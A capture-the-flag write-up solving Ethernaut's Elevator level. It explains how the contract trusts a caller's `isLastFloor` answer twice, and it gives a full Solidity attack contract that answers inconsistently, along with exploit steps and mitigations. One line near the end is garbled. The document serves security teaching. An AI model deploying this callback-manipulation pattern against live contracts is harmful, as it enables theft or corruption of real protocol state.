# Ethernaut #11 — Elevator

## Objective

Reach the top of the building: make `top` in the `Elevator` contract `true`.

## Vulnerability: Trusting an External Contract to Answer Consistently

`Elevator.goTo(_floor)` treats whoever calls it as a `Building` and asks that caller whether a floor is the last one:

1. Ask `isLastFloor(_floor)`. If the answer is `false`, continue.
2. Store `floor = _floor`.
3. Ask `isLastFloor(floor)` again and store the answer in `top`.

To reach the top, the first answer must be `false` and the second `true`, for the same floor. The contract assumes a building can't answer the same question differently twice. Nothing enforces that.

## Root Cause

`Elevator` takes the answer from code it doesn't control, and it asks the same question twice. Two assumptions are hidden in that:

- **The callee is honest:** `msg.sender` is any contract that implements the function, and the attacker writes it.
- **The answer is stable:** the interface declares `isLastFloor` without `view`, so nothing stops the implementation from changing its own state between the two calls.

## Attack Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IElevator {
    function goTo(uint256) external;
}

contract Building {
    uint256 lastFloor = 100;
    address elevator = 0xEF57C03EB1ef48cDcFA0F55d115C804C8675a232;

    function isLastFloor(uint256 _floor) external returns (bool) {
        bool ans = (lastFloor == _floor);
        lastFloor = _floor;
        return ans;
    }

    function attack() external {
        IElevator(elevator).goTo(10);
    }
}
```

The contract remembers the last floor it was asked about. A different floor gives `false`, and the same floor again gives `true`.

| call | `lastFloor` before | answer | `lastFloor` after |
|---|---|---|---|
| 1st: `isLastFloor(10)` | 100 | `100 == 10` → false | 10 |
| 2nd: `isLastFloor(10)` | 10 | `10 == 10` → true | 10 |

The first answer is `false`, so `goTo` continues and stores `floor = 10`. The second is `true`, so `top` becomes `true`.

The starting value of 100 is arbitrary. It only has to differ from the floor passed in. The trick also works only once, since a second call would see `lastFloor` already equal to 10.

## Exploit

1. Read `Elevator` and notice that `goTo` asks `isLastFloor` twice and uses the two answers for different purposes.
2. Notice that the caller is a contract I control, so I choose the answers.
3. Write a contract that returns `false` the first time and `true` the second, using a variable that changes between calls.
4. Deploy it, then call `attack()`, which calls `goTo(10)` on the instance.
5. Verify that `top()` returns `true`, then submit the instance.


**On `cast send` `top()` went from `false` to `true`, and then repeated the same steps against Sepolia.

## Impact

An attacker can make a contract that trusts an external callee reach any state that depends on two answers disagreeing. Here that means reaching the top of a building the contract thinks it has checked properly. In a real system, the same pattern lets a malicious integrator make a protocol read different values for the same question within one call.

## Key Takeaways

- Any contract that implements an interface is under the attacker's control, so answers from callbacks are untrusted input.
- Asking an external contract the same question twice assumes it gives the same answer twice. Nothing in the language guarantees that.
- An interface that omits `view` lets an implementation change state while answering.
- Declaring `view` isn't a complete defence. A read-only implementation can still answer differently by reading state that changes between calls. In this contract, `floor` is public, and it is 0 at the first question and `_floor` at the second.

## Mitigation

- **Ask once.** Store the answer in a local variable, and use that single value for both the check and the assignment to `top`. With one answer there is nothing to disagree. This is the real fix.
- **Declare `isLastFloor` as `view` in the interface** (or `pure` if it reads nothing). It blocks implementations that change their own state between calls, which makes it a good defence in depth.
- `view` alone isn't enough. A read-only `Building` could read the Elevator's own `floor` and answer `false` while it is 0 and `true` once it equals the requested floor, without writing any state. Only removing the second question closes that.
- Don't treat an external callback's answer as trustworthy without validating or constraining it.